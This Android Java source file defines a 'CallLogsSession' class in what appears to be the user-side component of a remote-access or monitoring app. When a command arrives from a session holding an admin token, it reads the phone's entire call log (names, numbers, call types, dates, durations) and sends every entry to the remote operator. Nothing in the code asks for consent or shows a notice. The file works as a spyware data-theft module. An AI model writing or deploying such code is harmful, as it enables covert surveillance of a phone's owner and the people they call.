package com.lyrnic.userside.sessions;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;

import com.lyrnic.userside.constants.Actions;
import com.lyrnic.userside.constants.Constants;
import com.lyrnic.userside.listeners.OnRequestSendMessageListener;

import org.json.JSONException;
import org.json.JSONObject;

public class CallLogsSession extends Session{

    public CallLogsSession(Context context, String adminToken, OnRequestSendMessageListener onRequestSendMessageListener, int id) {
        super(context, adminToken, onRequestSendMessageListener, id);
    }

    @Override
    public void onMessageReceived(String message) {
        super.onMessageReceived(message);
        try{
            handleMessage(message);
        }
        catch (JSONException e){
            throw new RuntimeException(e);
        }
    }

    public void handleMessage(String message) throws JSONException {
        JSONObject jsonObject = new JSONObject(message);

        String action = jsonObject.getString(Constants.ACTION_KEY);

        switch (action){
            case Actions.ACTION_REQUEST_GET_CALL_LOGS:
                sendCallLogs();
                break;
        }

    }
    @SuppressLint("Range")
    private void sendCallLogs() {
        String[] projection = new String[] {
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
        };

        // Sorting by DATE in descending order
        String sortOrder = CallLog.Calls.DATE + " DESC";

        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, null, null, sortOrder);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                long time = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                long duration = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION));

                sendCallLog(name, number, type, time, duration);
            }
            cursor.close();
        }
    }


    private void sendCallLog(String name, String number, int type, long time, long duration) {
        try {
            JSONObject jsonObject = new JSONObject();

            jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_RECEIVE_CALL_LOG);

            if (name == null) name = "Unknown";

            jsonObject.put("name", name);
            jsonObject.put("number", number);
            jsonObject.put("type", type);
            jsonObject.put("date", time);
            jsonObject.put("duration", duration);

            sendMessage(jsonObject.toString());
        }
        catch (JSONException e){
            throw new RuntimeException(e);
        }
    }


}
